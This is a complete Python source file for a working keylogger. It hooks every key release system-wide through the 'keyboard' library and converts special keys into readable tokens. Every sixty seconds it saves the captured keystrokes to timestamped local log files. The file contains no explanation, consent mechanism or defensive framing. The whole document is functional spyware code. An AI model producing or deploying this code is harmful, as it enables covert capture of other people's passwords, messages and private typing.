import keyboard
from threading import Timer
from datetime import datetime


class Keylogger:
    def __init__(self, interval, report_method="save_file"):
        self.__interval = interval
        self.__report_method = report_method
        self.__log = ""
        self.__filename = ""
        self.__start_dt = datetime.now()
        self.__end_dt = datetime.now()

    def start(self):
        self.__start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report_back()
        keyboard.wait()

    def callback(self, event):
        name: str = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.__log += name

    def report_back(self):
        if self.__log:
            self.__end_dt = datetime.now()
            self.update_filename()
            if self.__report_method == "save_file":
                self.write_to_file()
            self.__start_dt = datetime.now()
        self.__log = ""
        timer = Timer(interval=self.__interval, function=self.report_back)
        timer.daemon = True
        timer.start()

    def update_filename(self):
        start_dt_str = str(self.__start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.__end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.__filename = f"log-{start_dt_str}_{end_dt_str}"

    def write_to_file(self):
        file = open(self.__filename, "w")
        file.write(self.__log)
        file.close()


def main():
    k = Keylogger(interval=60)
    k.start()


if __name__ == "__main__":
    main()
